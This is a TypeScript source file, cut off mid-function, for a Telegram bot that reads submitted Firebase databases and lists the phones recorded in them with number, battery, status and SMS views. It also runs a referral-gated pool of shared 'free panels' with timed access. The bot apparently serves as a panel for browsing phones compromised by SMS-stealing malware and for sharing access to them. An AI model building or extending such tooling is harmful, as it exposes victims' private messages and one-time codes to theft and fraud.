import { Telegraf, Markup } from "telegraf";
import type { Context } from "telegraf";
import { config } from "./config.js";
import {
  addConnection, adminStats, countConnections, ensureUser, eventSeen, getConnection, getConnections,
  getAdminConnections, getAdminUsers, getDevices, getSetting, getSummary, isBanned, logSystem,
  markConnectionChecked, markEventSeen, pool, removeConnection, replaceDevices, setSetting,
  setUserBanned, ensureSchema, registerReferral, qualifyReferral, getReferralStats,
  addFreeFirebasePanel, getFreeFirebasePanels, removeFreeFirebasePanel, claimFreeFirebase,
  getClaimedFreePanel, addRequiredChannel, getRequiredChannels, removeRequiredChannel,
  getAccessStatus, grantTimedAccess, grantTimedAccessToUsers, grantTimedAccessToAllUsers
} from "./db.js";
import { collectEvents, extractDevices, readFirebase, validateFirebaseUrl } from "./firebase.js";
import { back, clearSession, getSession, pushScreen, setSession } from "./state.js";
import {
  adminConnectionsKeyboard, adminConnectionsText, adminKeyboard, adminSettingsKeyboard,
  adminSettingsText, adminUserKeyboard, adminUserText, adminUsersKeyboard, adminUsersText,
  connectionKeyboard, firebaseListText, homeKeyboard, homeText, navKeyboard,
  freePanelKeyboard, freePanelText, adminFreeAccessKeyboard, adminFreeAccessText,
  adminReferralKeyboard, adminReferralText, adminFreePoolKeyboard, adminFreePoolText,
  adminChannelsKeyboard, adminChannelsText, adminContentKeyboard, adminContentPrompt,
  adminContentText, DEFAULT_HOW_TO_USE_MESSAGE, DEFAULT_MAINTENANCE_MESSAGE,
  DEFAULT_REFERRAL_MESSAGE, DEFAULT_WELCOME_MESSAGE, adminAuditChannelKeyboard, adminAuditChannelText,
  adminImagesKeyboard, adminImagesText, premiumizeKeyboard,
  accessGateKeyboard, accessGateText, deviceDetailKeyboard, deviceDetailText,
  lastSmsKeyboard, lastSmsText, liveSmsText, adminDashboardText,
  adminGiftAccessText, adminGiftAccessKeyboard, adminGiftSpecificText, adminGiftSpecificKeyboard
} from "./ui.js";
import type { Device, DeviceSummary, RequiredChannel } from "./types.js";
import { logger } from "../lib/logger.js";

const bot = new Telegraf(config.TELEGRAM_BOT_TOKEN);
type FreshSnapshot = { devices: Device[]; summary: DeviceSummary };
type BatchResult = { url: string; status: "connected" | "failed" | "duplicate" | "skipped"; detail: string; summary?: DeviceSummary };
const scanLocks = new Map<string, Promise<FreshSnapshot>>();
type DeviceMonitor = {
  active: boolean;
  timer: ReturnType<typeof setInterval>;
  chatId?: number;
  messageId?: number;
  sourceName?: string;
};
const monitors = new Map<string, DeviceMonitor>();
const homeMonitors = new Map<number, DeviceMonitor>();
const answeredCallbacks = new WeakSet<object>();
const POOL_SCAN_TIMEOUT_MS = 8_000;
const POOL_CACHE_TTL_MS = 10_000;
let botUsername = "";
const IMAGE_SETTING_KEYS = {
  welcome: "welcome_image_file_id",
  access: "access_image_file_id",
  device: "device_image_file_id",
} as const;
type PoolSourceSnapshot = {
  panel: Awaited<ReturnType<typeof getFreeFirebasePanels>>[number];
  devices: Device[];
  ok: boolean;
  stale?: boolean;
  error?: string;
};
type PoolSnapshot = {
  sources: PoolSourceSnapshot[];
  configuredSources: number;
};
let poolSnapshotCache: { value: PoolSnapshot; expiresAt: number } | undefined;
let poolSnapshotPromise: Promise<PoolSnapshot> | undefined;
const poolLastGoodSources = new Map<string, PoolSourceSnapshot>();
let poolRefreshTimer: ReturnType<typeof setInterval> | undefined;

function invalidatePoolSnapshot() {
  poolSnapshotCache = undefined;
}

function userId(ctx: Context): number {
  if (!ctx.from) throw new Error("Missing Telegram user");
  return ctx.from.id;
}

function callbackMessageId(ctx: Context): number | undefined {
  if (!("callbackQuery" in ctx) || !ctx.callbackQuery?.message) return undefined;
  return ctx.callbackQuery.message.message_id;
}

function admin(ctx: Context) {
  return userId(ctx) === config.ADMIN_TELEGRAM_ID;
}

async function answerCallback(ctx: Context, text?: string, extra?: any) {
  if (!("callbackQuery" in ctx) || !ctx.callbackQuery) return;
  if (answeredCallbacks.has(ctx)) {
    if (extra?.show_alert && text) await ctx.reply(text);
    return;
  }
  answeredCallbacks.add(ctx);
  try {
    await ctx.answerCbQuery(text, extra);
  } catch {
    // Telegram may reject callbacks that expired while the process was busy.
  }
}

async function baseGuard(ctx: Context): Promise<boolean> {
  void answerCallback(ctx);
  await ensureUser(ctx);
  const id = userId(ctx);
  if (await isBanned(id)) {
    await ctx.reply("🚫 Your access is currently restricted.");
    return false;
  }
  if ((await getSetting("maintenance_mode", "false")) === "true" && !admin(ctx)) {
    await ctx.reply(await getSetting("maintenance_message", DEFAULT_MAINTENANCE_MESSAGE));
    return false;
  }
  return true;
}

async function renderAccessGate(ctx: Context, includeImage = false) {
  const id = userId(ctx);
  const channels = await getRequiredChannels();
  const membership = await checkRequiredChannels(ctx, channels);
  if (membership.allJoined) await qualifyReferral(id);
  const [stats, access, durationValue] = await Promise.all([
    getReferralStats(id),
    getAccessStatus(id),
    getSetting("access_duration_minutes", "45")
  ]);
  const minimum = Number(await getSetting("minimum_referrals", "3"));
  const durationMinutes = Math.max(1, Number(durationValue) || 45);
  const referralLink = botUsername ? `https://t.me/${botUsername}?start=ref_${id}` : undefined;
  await editOrReplyWithConfiguredImage(
    ctx,
    accessGateText(stats, minimum, durationMinutes, channels, membership.joined, referralLink, access),
    accessGateKeyboard(channels, referralLink),
    includeImage ? IMAGE_SETTING_KEYS.access : undefined
  );
}

async function guard(ctx: Context): Promise<boolean> {
  if (!(await baseGuard(ctx))) return false;
  if (admin(ctx)) return true;
  const access = await getAccessStatus(userId(ctx));
  if (access.active) return true;
  await renderAccessGate(ctx);
  return false;
}

async function editOrReply(ctx: Context, text: string, keyboard?: unknown) {
  if ("callbackQuery" in ctx && ctx.callbackQuery) {
    try {
      await ctx.editMessageText(text, keyboard ? { reply_markup: keyboard as any } : undefined);
      return;
    } catch (error) {
      // Do not create a second message after a button tap. A failed edit is
      // usually a harmless no-op or an expired Telegram message.
      if (!/message is not modified|message can't be edited|message to edit not found/i.test(shortError(error))) {
        await logSystem("warn", "callback_message_edit_failed", shortError(error), userId(ctx));
      }
      return;
    }
  }
  const styledKeyboard = premiumizeKeyboard(keyboard) as any;
  await ctx.reply(text, styledKeyboard ? Markup.inlineKeyboard(styledKeyboard.inline_keyboard) : undefined);
}

async function editOrReplyWithConfiguredImage(
  ctx: Context,
  text: string,
  keyboard: unknown,
  settingKey?: string
) {
  if (!settingKey) {
    await editOrReply(ctx, text, keyboard);
    return;
  }
  const fileId = (await getSetting(settingKey, "")).trim();
  if (!fileId) {
    await editOrReply(ctx, text, keyboard);
    return;
  }
  const styledKeyboard = premiumizeKeyboard(keyboard) as any;
  const caption = text.slice(0, 1024);
  const photoOptions = {
    caption,
    ...(styledKeyboard ? { reply_markup: styledKeyboard } : {})
  } as any;

  try {
    const callbackMessage = "callbackQuery" in ctx ? ctx.callbackQuery?.message : undefined;
    if (callbackMessage && "photo" in callbackMessage) {
      await ctx.editMessageCaption(caption, styledKeyboard ? { reply_markup: styledKeyboard } as any : undefined);
      return;
    }
    if (callbackMessage && ctx.chat) {
      try {
        await ctx.telegram.deleteMessage(ctx.chat.id, callbackMessage.message_id);
      } catch {
        // The message may already have been removed or may be too old to delete.
      }
    }
    await ctx.replyWithPhoto(fileId, photoOptions);
  } catch (error) {
    await logSystem("warn", "configured_image_send_failed", `${settingKey}: ${shortError(error)}`, userId(ctx));
    await editOrReply(ctx, text, keyboard);
  }
}

async function scanConnection(telegramId: number, firebaseId: string): Promise<FreshSnapshot> {
  const connection = await getConnection(telegramId, firebaseId);
  if (!connection) throw new Error("Firebase connection not found");
  const lockKey = `${telegramId}:${firebaseId}`;
  const existing = scanLocks.get(lockKey);
  if (existing) return existing;
  const scan = (async (): Promise<FreshSnapshot> => {
    try {
      const root = await readFirebase(connection.firebaseUrl);
      const devices = extractDevices(root);
      await replaceDevices(firebaseId, devices);
      await markConnectionChecked(firebaseId, "connected");
      return {
        devices,
        summary: {
          total: devices.length,
          online: devices.filter(device => device.status === "online").length,
          offline: devices.filter(device => device.status === "offline").length,
        },
      };
    } catch (error) {
      await markConnectionChecked(firebaseId, "error");
      await logSystem("error", "firebase_scan_failed", error instanceof Error ? error.message : String(error), telegramId);
      throw error;
    }
  })();
  scanLocks.set(lockKey, scan);
  try {
    return await scan;
  } finally {
    if (scanLocks.get(lockKey) === scan) scanLocks.delete(lockKey);
  }
}

async function allSummary(telegramId: number) {
  const connections = await getConnections(telegramId);
  const summaries = new Map<string, DeviceSummary>();
  const values = await Promise.all(connections.map(async connection => [connection.id, await getSummary(connection.id)] as const));
  for (const [id, summary] of values) summaries.set(id, summary);
  return { connections, summaries };
}

async function refreshAllConnections(telegramId: number) {
  const connections = await getConnections(telegramId);
  await Promise.allSettled(connections.map(connection => scanConnection(telegramId, connection.id)));
  return allSummary(telegramId);
}

function summaryForDevices(devices: Device[]): DeviceSummary {
  return {
    total: devices.length,
    online: devices.filter(device => device.status === "online").length,
    offline: devices.filter(device => device.status === "offline").length,
  };
}

function addSummary(target: DeviceSummary, source: DeviceSummary) {
  target.total += source.total;
  target.online += source.online;
  target.offline += source.offline;
}

function aggregateHomeSources(
  connections: Awaited<ReturnType<typeof getConnections>>,
  summaries: Map<string, DeviceSummary>,
  pool?: PoolSnapshot
): { sourceCount: number; devices: DeviceSummary } {
  const sources = new Map<string, DeviceSummary>();
  for (const connection of connections) {
    sources.set(connection.firebaseUrl, summaries.get(connection.id) ?? { total: 0, online: 0, offline: 0 });
  }
  for (const source of pool?.sources ?? []) {
    if (source.ok || source.stale || !sources.has(source.panel.firebaseUrl)) {
      sources.set(source.panel.firebaseUrl, summaryForDevices(source.devices));
    }
  }
  const devices = { total: 0, online: 0, offline: 0 };
  for (const summary of sources.values()) addSummary(devices, summary);
  return { sourceCount: sources.size, devices };
}

async function readPoolSources(force = false): Promise<PoolSnapshot> {
  if (!force && poolSnapshotCache && poolSnapshotCache.expiresAt > Date.now()) {
    return poolSnapshotCache.value;
  }
  if (poolSnapshotPromise) return poolSnapshotPromise;

  poolSnapshotPromise = (async () => {
    const panels = (await getFreeFirebasePanels()).filter(panel => panel.active);
    const results = await Promise.all(panels.map(async panel => {
      try {
        const root = await readFirebase(panel.firebaseUrl, POOL_SCAN_TIMEOUT_MS);
        const result = { panel, devices: extractDevices(root), ok: true } satisfies PoolSourceSnapshot;
        poolLastGoodSources.set(panel.firebaseUrl, result);
        return result;
      } catch (error) {
        const previous = poolLastGoodSources.get(panel.firebaseUrl);
        return {
          panel,
          devices: previous?.devices ?? [],
          ok: false,
          stale: Boolean(previous),
          error: shortError(error)
        } satisfies PoolSourceSnapshot;
      }
    }));
    const value = { sources: results, configuredSources: panels.length };
    poolSnapshotCache = { value, expiresAt: Date.now() + POOL_CACHE_TTL_MS };
    return value;
  })();

  try {
    return await poolSnapshotPromise;
  } finally {
    poolSnapshotPromise = undefined;
  }
}

function cachedPoolSources(): PoolSnapshot | undefined {
  if (poolSnapshotCache) return poolSnapshotCache.value;
  if (!poolLastGoodSources.size) return undefined;
  return {
    sources: [...poolLastGoodSources.values()],
    configuredSources: poolLastGoodSources.size
  };
}

async function renderHome(ctx: Context, includeImage = false, refresh = true) {
  const id = userId(ctx);
  unselectDevice(id);
  const [{ connections, summaries }, pool] = await Promise.all([
    refresh ? refreshAllConnections(id) : allSummary(id),
    refresh ? readPoolSources(true).catch(() => cachedPoolSources()) : cachedPoolSources()
  ]);
  clearSession(id);
  const combined = aggregateHomeSources(connections, summaries, pool);
  const limit = Number(await getSetting("firebase_limit", "0"));
  const welcomeMessage = await getSetting("welcome_message", DEFAULT_WELCOME_MESSAGE);
  await editOrReplyWithConfiguredImage(
    ctx,
    homeText({ connections: combined.sourceCount, devices: combined.devices }, limit, welcomeMessage),
    homeKeyboard(admin(ctx)),
    includeImage ? IMAGE_SETTING_KEYS.welcome : undefined
  );
}

function refreshHomeInBackground(ctx: Context) {
  const id = userId(ctx);
  void (async () => {
    try {
      if (getSession(id).screen !== "home") return;
      await renderHome(ctx, false, true);
    } catch (error) {
      await logSystem("warn", "background_home_refresh_failed", shortError(error), id);
    }
  })();
}

function stopHomeMonitor(telegramId: number) {
  const monitor = homeMonitors.get(telegramId);
  if (!monitor) return;
  monitor.active = false;
  clearInterval(monitor.timer);
  homeMonitors.delete(telegramId);
}

function startHomeMonitor(ctx: Context) {
  const telegramId = userId(ctx);
  const chatId = ctx.chat?.id;
  const messageId = callbackMessageId(ctx);
  if (!chatId || !messageId) return;
  stopHomeMonitor(telegramId);
  let monitor: DeviceMonitor | undefined;
  const poll = async () => {
    if (!monitor?.active || homeMonitors.get(telegramId) !== monitor) return;
    if (getSession(telegramId).screen !== "home") {
      stopHomeMonitor(telegramId);
      return;
    }
    try {
      const [{ connections, summaries }, poolSnapshot] = await Promise.all([
        refreshAllConnections(telegramId),
        readPoolSources(true)
      ]);
      if (!monitor?.active || getSession(telegramId).screen !== "home") return;
      const combined = aggregateHomeSources(connections, summaries, poolSnapshot);
      const keyboard = premiumizeKeyboard(homeKeyboard(telegramId === config.ADMIN_TELEGRAM_ID)) as any;
      const welcomeMessage = await getSetting("welcome_message", DEFAULT_WELCOME_MESSAGE);
      await bot.telegram.editMessageText(
        chatId,
        messageId,
        undefined,
        homeText({ connections: combined.sourceCount, devices: combined.devices }, Number(await getSetting("firebase_limit", "0")), welcomeMessage),
        { reply_markup: keyboard }
      );
    } catch (error) {
      await logSystem("warn", "home_auto_refresh_failed", shortError(error), telegramId);
    }
  };
  monitor = {
    active: true,
    timer: setInterval(() => { void poll(); }, config.FIREBASE_SCAN_INTERVAL_MS),
    chatId,
    messageId
  };
  homeMonitors.set(telegramId, monitor);
}

function startPoolRefreshLoop() {
  if (poolRefreshTimer) return;
  const refresh = async () => {
    try {
      await readPoolSources(true);
    } catch (error) {
      await logSystem("warn", "pool_auto_refresh_failed", shortError(error));
    }
  };
  poolRefreshTimer = setInterval(() => { void refresh(); }, config.FIREBASE_SCAN_INTERVAL_MS);
  void refresh();
}

function stopPoolRefreshLoop() {
  if (!poolRefreshTimer) return;
  clearInterval(poolRefreshTimer);
  poolRefreshTimer = undefined;
}

async function renderFirebaseList(ctx: Context) {
  const id = userId(ctx);
  const { connections, summaries } = await allSummary(id);
  const limit = Number(await getSetting("firebase_limit", "0"));
  pushScreen(id, "my_firebase");
  await editOrReply(ctx, firebaseListText(connections, summaries, limit), connectionKeyboard(connections, "firebase"));
}

async function renderDevices(ctx: Context) {
  const id = userId(ctx);
  unselectDevice(id);
  const { connections, summaries } = await allSummary(id);
  if (!connections.length) return editOrReply(ctx, "📱 DEVICES\n\nAdd a Firebase connection first.", navKeyboard());
  if (connections.length > 1) return editOrReply(ctx, "━━━━━━━━━━━━━━━━━━━━\n📱 SELECT FIREBASE\n━━━━━━━━━━━━━━━━━━━━\n\nChoose a Firebase to view live devices.", connectionKeyboard(connections, "devices_firebase"));
  await renderDevicePage(ctx, connections[0].id, 0);
}

async function renderDevicePage(ctx: Context, firebaseId: string, page: number, snapshot?: FreshSnapshot) {
  const id = userId(ctx);
  // Returning to the device list means the previously selected device is no
  // longer selected, so its live message monitor must be stopped.
  unselectDevice(id);
  const connection = await getConnection(id, firebaseId);
  if (!connection) return editOrReply(ctx, "❌ Firebase connection not found.", navKeyboard());
  let fresh = snapshot;
  if (!fresh) {
    try {
      fresh = await scanConnection(id, firebaseId);
    } catch (error) {
      return editOrReply(ctx, `❌ CONNECTION FAILED\n\n${error instanceof Error ? error.message : "Unable to read Firebase data."}`, navKeyboard());
    }
  }
  const devices = fresh.devices;
  const summary = fresh.summary;
  const totalPages = Math.max(1, Math.ceil(devices.length / config.DEVICE_PAGE_SIZE));
  const current = Math.min(Math.max(page, 0), totalPages - 1);
  setSession(id, { screen: "devices", selectedFirebaseId: firebaseId, page: current });
  const slice = devices.slice(current * config.DEVICE_PAGE_SIZE, (current + 1) * config.DEVICE_PAGE_SIZE);
  const lines = ["━━━━━━━━━━━━━━━━━━━━", "📊 LIVE DEVICE STATUS", "━━━━━━━━━━━━━━━━━━━━", "", `🔥 ${connection.displayName}`, "", `📱 Total Devices: ${summary.total}`, `🟢 Online: ${summary.online}`, `🔴 Offline: ${summary.offline}`, "", `Page ${current + 1}/${totalPages}`, "", "Tap a device for authorized details."];
  if (!slice.length) lines.push("", "No recognizable device records were found in this Firebase database.");
  const buttons = slice.map(device => [{
    text: `${device.status === "online" ? "🟢" : "🔴"} ${device.deviceId} | ${device.number ?? "Number unavailable"} | 🔋 ${device.battery !== undefined ? `${device.battery}%` : "Battery unavailable"}`,
    callback_data: `device:${firebaseId}:${encodeURIComponent(device.normalizedDeviceId)}`
  }]);
  const pager = [];
  if (current > 0) pager.push({ text: "⬅️ Previous", callback_data: `page:${firebaseId}:${current - 1}` });
  pager.push({ text: `${current + 1}/${totalPages}`, callback_data: "noop" });
  if (current < totalPages - 1) pager.push({ text: "➡️ Next", callback_data: `page:${firebaseId}:${current + 1}` });
  buttons.push(pager, [{ text: "🔄 Rescan", callback_data: `rescan:${firebaseId}` }], [{ text: "⬅️ Back", callback_data: "back" }, { text: "🏠 Home", callback_data: "home" }]);
  await editOrReply(ctx, lines.join("\n"), { inline_keyboard: buttons });
}

async function animate(ctx: Context, steps: string[]) {
  let messageId: number | undefined;
  if ("callbackQuery" in ctx && ctx.callbackQuery && "message" in ctx.callbackQuery && ctx.callbackQuery.message) messageId = ctx.callbackQuery.message.message_id;
  for (const step of steps) {
    if (messageId) {
      try { await ctx.telegram.editMessageText(ctx.chat!.id, messageId, undefined, step); } catch { /* best effort */ }
    } else {
      const message = await ctx.reply(step);
      messageId = message.message_id;
    }
    await new Promise(resolve => setTimeout(resolve, 450));
  }
}

async function scanAndRender(ctx: Context, firebaseId: string) {
  await animate(ctx, ["⏳ Checking Firebase...", "🔄 Connecting to Firebase...", "📡 Reading database structure...", "🔍 Searching for device records...", "📊 Calculating live device status...", "🔄 Verifying connection..."]);
  try {
    const result = await scanConnection(userId(ctx), firebaseId);
    const page = getSession(userId(ctx)).page;
    await renderDevicePage(ctx, firebaseId, page, result);
  } catch (error) {
    await editOrReply(ctx, `❌ CONNECTION FAILED\n\nThe Firebase database could not be accessed.\n\nReason:\n${error instanceof Error ? error.message : "Connection unavailable"}\n\nPlease check the Firebase URL and authorized access settings.`, { inline_keyboard: [[{ text: "🔄 Try Again", callback_data: `rescan:${firebaseId}` }], [{ text: "🏠 Home", callback_data: "home" }]] });
  }
}

async function connectNewFirebase(ctx: Context, url: string): Promise<string> {
  const root = await readFirebase(url);
  const devices = extractDevices(root);
  const connectionCount = await countConnections(userId(ctx));
  const firebaseId = await addConnection(userId(ctx), url, `Firebase ${connectionCount + 1}`);
  try {
    await replaceDevices(firebaseId, devices);
    await markConnectionChecked(firebaseId, "connected");
    return firebaseId;
  } catch (error) {
    await removeConnection(userId(ctx), firebaseId);
    throw error;
  }
}

function splitFirebaseUrls(text: string): string[] {
  const detected = text.match(/https?:\/\/[^\s,]+/gi) ?? text.split(/[\r\n,]+/);
  return [...new Set(
    detected
      .map(value => value.trim().replace(/[),.;]+$/, ""))
      .filter(Boolean)
  )];
}

type FreePoolEntry = { raw: string; displayName?: string; url?: string };

function splitFreePoolEntries(text: string): FreePoolEntry[] {
  return text
    .split(/\r?\n|,(?=\s*(?:[^|,\r\n]+\s*\|\s*)?https?:\/\/)/i)
    .map(raw => raw.trim())
    .filter(Boolean)
    .map(raw => {
      const match = raw.match(/https?:\/\/[^\s,]+/i);
      const url = match?.[0]?.replace(/[),.;]+$/, "");
      const namePart = match ? raw.slice(0, match.index).trim().replace(/[|:]\s*$/, "").trim() : "";
      return { raw, displayName: namePart || undefined, url };
    });
}

function shortError(error: unknown): string {
  const message = error instanceof Error ? error.message : String(error);
  return message.replace(/\s+/g, " ").slice(0, 220);
}

async function updateBatchProgress(ctx: Context, messageId: number, text: string, keyboard?: unknown) {
  try {
    const styledKeyboard = premiumizeKeyboard(keyboard) as any;
    await ctx.telegram.editMessageText(
      ctx.chat!.id,
      messageId,
      undefined,
      text,
      styledKeyboard ? { reply_markup: styledKeyboard } : undefined
    );
  } catch {
    // Telegram rejects edits when the text is unchanged; the batch can continue.
  }
}

async function checkRequiredChannels(ctx: Context, channels: RequiredChannel[]) {
  const joined = new Map<string, boolean>();
  for (const channel of channels) {
    try {
      const member = await ctx.telegram.getChatMember(channel.chatId, userId(ctx));
      joined.set(channel.id, ["creator", "administrator", "member"].includes(member.status) || (member.status === "restricted" && member.is_member));
    } catch (error) {
      joined.set(channel.id, false);
      await logSystem("warn", "channel_membership_check_failed", `${channel.chatId}: ${shortError(error)}`, userId(ctx));
    }
  }
  return { joined, allJoined: channels.every(channel => joined.get(channel.id) === true) };
}

async function renderFreePanels(ctx: Context) {
  const id = userId(ctx);
  const channels = await getRequiredChannels();
  const membership = await checkRequiredChannels(ctx, channels);
  if (membership.allJoined) await qualifyReferral(id);
  const [stats, panels, claimed, referralMessage] = await Promise.all([
    getReferralStats(id),
    getFreeFirebasePanels(),
    getClaimedFreePanel(id),
    getSetting("referral_message", DEFAULT_REFERRAL_MESSAGE)
  ]);
  const minimum = Number(await getSetting("minimum_referrals", "3"));
  const available = panels.filter(panel => panel.active && !panel.assignedTo).length;
  const referralLink = botUsername ? `https://t.me/${botUsername}?start=ref_${id}` : undefined;
  const canClaim = membership.allJoined && stats.qualified >= minimum && !stats.claimed && available > 0;
  setSession(id, { screen: "free_panels" });
  await editOrReply(
    ctx,
     freePanelText(stats, minimum, channels, membership.joined, available, referralLink, claimed, referralMessage),
    freePanelKeyboard(channels, referralLink, stats.claimed, canClaim)
  );
}

async function renderAdminFreeAccess(ctx: Context) {
  if (!admin(ctx)) return;
  const [panels, channels] = await Promise.all([getFreeFirebasePanels(), getRequiredChannels()]);
  const minimum = Number(await getSetting("minimum_referrals", "3"));
  const duration = Math.max(1, Number(await getSetting("access_duration_minutes", "45")) || 45);
  await editOrReply(ctx, adminFreeAccessText(minimum, duration, panels, channels), adminFreeAccessKeyboard());
}

async function renderAdminFreePool(ctx: Context) {
  if (!admin(ctx)) return;
  const panels = await getFreeFirebasePanels();
  await editOrReply(ctx, adminFreePoolText(panels), adminFreePoolKeyboard(panels));
}

async function renderAdminChannels(ctx: Context) {
  if (!admin(ctx)) return;
  const channels = await getRequiredChannels();
  await editOrReply(ctx, adminChannelsText(channels), adminChannelsKeyboard(channels));
}

async function renderAdminContent(ctx: Context) {
  if (!admin(ctx)) return;
  const [referralMessage, maintenanceMessage, howToUseMessage, welcomeMessage] = await Promise.all([
    getSetting("referral_message", DEFAULT_REFERRAL_MESSAGE),
    getSetting("maintenance_message", DEFAULT_MAINTENANCE_MESSAGE),
    getSetting("how_to_use_message", DEFAULT_HOW_TO_USE_MESSAGE),
    getSetting("welcome_message", DEFAULT_WELCOME_MESSAGE)
  ]);
  await editOrReply(
    ctx,
    adminContentText(referralMessage, maintenanceMessage, howToUseMessage, welcomeMessage),
    adminContentKeyboard()
  );
}

async function renderAdminImages(ctx: Context) {
  if (!admin(ctx)) return;
  const [welcome, access, device] = await Promise.all([
    getSetting(IMAGE_SETTING_KEYS.welcome, ""),
    getSetting(IMAGE_SETTING_KEYS.access, ""),
    getSetting(IMAGE_SETTING_KEYS.device, "")
  ]);
  await editOrReply(
    ctx,
    adminImagesText(Boolean(welcome), Boolean(access), Boolean(device)),
    adminImagesKeyboard(Boolean(welcome), Boolean(access), Boolean(device))
  );
}

async function renderAdminAuditChannel(ctx: Context) {
  if (!admin(ctx)) return;
  const [chatId, title, link] = await Promise.all([
    getSetting("audit_channel_chat_id", ""),
    getSetting("audit_channel_title", ""),
    getSetting("audit_channel_link", "")
  ]);
  await editOrReply(ctx, adminAuditChannelText(chatId, title, link), adminAuditChannelKeyboard(Boolean(chatId)));
}

async function registerStartReferral(ctx: Context) {
  if (!ctx.message || !("text" in ctx.message)) return;
  const payload = ctx.message.text.trim().split(/\s+/, 2)[1] ?? "";
  if (!payload.toLowerCase().startsWith("ref_")) return;
  const referrerId = Number(payload.slice(4));
  if (Number.isSafeInteger(referrerId) && referrerId > 0) await registerReferral(userId(ctx), referrerId);
}

async function addFreePoolFromText(ctx: Context, text: string) {
  const id = userId(ctx);
  const entries = splitFreePoolEntries(text);
  if (!entries.length) throw new Error("Send one or more Firebase URLs, one per line or separated by commas.");
  const before = await readPoolSources(true);
  const beforeSummary = before.sources.filter(source => source.ok || source.stale).reduce((total, source) => {
    addSummary(total, summaryForDevices(source.devices));
    return total;
  }, { total: 0, online: 0, offline: 0 });
  const panels = await getFreeFirebasePanels();
  const existingUrls = new Set(panels.map(panel => panel.firebaseUrl));
  const results: Array<{ entry: FreePoolEntry; status: "connected" | "failed" | "duplicate"; detail: string; summary?: DeviceSummary }> = [];
  const progress = await ctx.reply(`⏳ Checking Firebase sources...\n\nFound ${entries.length} source${entries.length === 1 ? "" : "s"}.\nEvery source will be verified before activation.`);
  let added = 0;
  for (let index = 0; index < entries.length; index++) {
    const entry = entries[index];
    const displayUrl = entry.url && entry.url.length > 90 ? `${entry.url.slice(0, 87)}...` : entry.url ?? entry.raw;
    await updateBatchProgress(ctx, progress.message_id, `🔄 Checking Firebase ${index + 1}/${entries.length}\n\n${displayUrl}`);
    try {
      if (!entry.url) throw new Error("No Firebase URL found");
      const url = validateFirebaseUrl(entry.url);
      if (existingUrls.has(url)) {
        results.push({ entry: { ...entry, url }, status: "duplicate", detail: "Already in the device source pool" });
        continue;
      }
      const root = await readFirebase(url);
      const devices = extractDevices(root);
      const displayName = (entry.displayName ?? `Free Firebase ${panels.length + added + 1}`).slice(0, 120);
      await addFreeFirebasePanel(url, displayName);
      existingUrls.add(url);
      added++;
      invalidatePoolSnapshot();
      results.push({ entry: { ...entry, url, displayName }, status: "connected", detail: "Checked and activated", summary: summaryForDevices(devices) });
    } catch (error) {
      results.push({ entry, status: "failed", detail: shortError(error) });
    }
  }

  invalidatePoolSnapshot();
  const after = await readPoolSources(true);
  const afterSummary = after.sources.filter(source => source.ok || source.stale).reduce((total, source) => {
    addSummary(total, summaryForDevices(source.devices));
    return total;
  }, { total: 0, online: 0, offline: 0 });
  const newDevices = results
    .filter(result => result.status === "connected")
    .reduce((total, result) => total + (result.summary?.total ?? 0), 0);
  setSession(id, { awaiting: undefined });
  const lines = [
    "━━━━━━━━━━━━━━━━━━━━",
    "📊 FIREBASE SOURCE BATCH RESULT",
    "━━━━━━━━━━━━━━━━━━━━",
    "",
    ...results.map((result, index) => {
      const label = result.status === "connected" ? "✅ ACTIVATED" : result.status === "duplicate" ? "↩️ DUPLICATE" : "❌ FAILED";
      const summary = result.summary ? `\n   Devices: ${result.summary.total} · Online: ${result.summary.online} · Offline: ${result.summary.offline}` : "";
      return `${index + 1}. ${label}\n   ${result.entry.url ?? result.entry.raw}\n   ${result.detail}${summary}`;
    }),
    "",
    "━━━━━━━━━━━━━━━━━━━━",
    "📈 ALL FIREBASE SUMMARY",
    "━━━━━━━━━━━━━━━━━━━━",
    "",
    `🔥 Sources Before: ${before.configuredSources}`,
    `✅ Sources Activated: ${added}`,
    `🔥 Sources After: ${after.configuredSources}`,
    `📱 Devices Before: ${beforeSummary.total}`,
    `➕ New Devices Added: ${newDevices}`,
    `📱 Devices After: ${afterSummary.total}`,
    `🟢 Online: ${afterSummary.online}`,
    `🔴 Offline: ${afterSummary.offline}`,
    "",
    `✅ Activated: ${results.filter(result => result.status === "connected").length}`,
    `❌ Failed: ${results.filter(result => result.status === "failed").length}`,
    `↩️ Duplicate: ${results.filter(result => result.status === "duplicate").length}`,
  ];
  await updateBatchProgress(ctx, progress.message_id, lines.join("\n").slice(0, 3900), adminFreePoolKeyboard(await getFreeFirebasePanels()));
  await logSystem("info", "free_firebase_batch_checked", `Activated ${added} of ${entries.length}; devices ${beforeSummary.total} -> ${afterSummary.total}`, id);
  await renderAdminFreePool(ctx);
}

async function addChannelFromText(ctx: Context, text: string) {
  const parts = text.split("|").map(part => part.trim()).filter(Boolean);
  const chatId = parts[0];
  if (!chatId || !(/^@[\w\d_]{3,}$/.test(chatId) || /^-?\d+$/.test(chatId))) {
    throw new Error("Send a channel @username or numeric chat ID.");
  }
  const inviteLink = parts[1];
  if (inviteLink && !/^https:\/\/t\.me\//i.test(inviteLink)) {
    throw new Error("Invite link must start with https://t.me/");
  }
  const chat = await ctx.telegram.getChat(chatId);
  const title = ("title" in chat && chat.title)
    || ("username" in chat && chat.username ? `@${chat.username}` : chatId);
  await addRequiredChannel(chatId, title, inviteLink);
  await logSystem("info", "required_channel_added", `${title} (${chatId})`, userId(ctx));
  setSession(userId(ctx), { awaiting: undefined });
  await ctx.reply(`✅ Required channel added.\n\n${title}\n${chatId}`);
  await renderAdminChannels(ctx);
}

async function addFirebaseBatch(ctx: Context, rawText: string) {
  const id = userId(ctx);
  const inputUrls = splitFirebaseUrls(rawText);
  const existingConnections = await getConnections(id);
  const beforeState = await allSummary(id);
  const beforeTotals = [...beforeState.summaries.values()].reduce((acc, summary) => {
    addSummary(acc, summary);
    return acc;
  }, { total: 0, online: 0, offline: 0 });
  const results: BatchResult[] = [];
  const progress = await ctx.reply(`⏳ Preparing Firebase checks...\n\nFound ${inputUrls.length} URL${inputUrls.length === 1 ? "" : "s"}.\nChecking every source one-by-one...`);

  if (!inputUrls.length) {
    await updateBatchProgress(ctx, progress.message_id, "❌ No Firebase URLs found.\n\nSend one URL per line, or separate them with commas.");
    return;
  }

  let added = 0;
  for (let index = 0; index < inputUrls.length; index++) {
    const rawUrl = inputUrls[index];
    const displayUrl = rawUrl.length > 90 ? `${rawUrl.slice(0, 87)}...` : rawUrl;
    await updateBatchProgress(ctx, progress.message_id, `🔄 Checking Firebase ${index + 1}/${inputUrls.length}\n\n${displayUrl}\n\nThis URL is being verified now...`);
    try {
